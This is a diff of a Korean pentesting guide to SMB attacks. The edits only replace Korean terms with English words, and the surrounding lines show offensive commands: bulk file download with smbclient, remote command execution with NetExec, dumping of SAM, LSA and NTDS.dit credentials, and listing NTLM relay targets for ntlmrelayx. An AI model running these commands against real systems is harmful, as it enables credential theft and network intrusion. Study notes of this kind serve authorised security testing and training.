@@ -54,7 +54,7 @@ smb: \> put localfile
 ### 유용한 smbclient 명령어
 
 ```bash
-smb: \> recurse ON        # 하위 디렉토리 포함
+smb: \> recurse ON        # 하위 directory 포함
 smb: \> prompt OFF        # 확인 프롬프트 비활성화
 smb: \> mget *            # 모든 파일 다운로드
 smb: \> allinfo filename  # 파일 상세 정보
@@ -151,13 +151,13 @@ nxc smb TARGET -u admin -p pass -x "whoami"
 nxc smb TARGET -u admin -p pass -X "Get-Process"  # PowerShell
 ```
 
-### 자격 증명 덤프
+### credential 덤프
 
 ```bash
 # SAM 덤프 (로컬 계정 해시)
 nxc smb TARGET -u admin -p pass --sam
 
-# LSA 덤프 (캐시된 자격 증명)
+# LSA 덤프 (캐시된 credential)
 nxc smb TARGET -u admin -p pass --lsa
 
 # NTDS.dit 덤프 (DC에서만, 모든 도메인 계정)
@@ -177,7 +177,7 @@ SMB Signing이 비활성화된 호스트는 NTLM Relay 공격 대상이 된다.
 # SMB Signing 상태 확인
 nxc smb 10.10.10.0/24 --gen-relay-list relay_targets.txt
 
-# signing:False 호스트 목록 → ntlmrelayx 타겟으로 사용
+# signing:False 호스트 목록 → ntlmrelayx target으로 사용
 ```
 
 ---
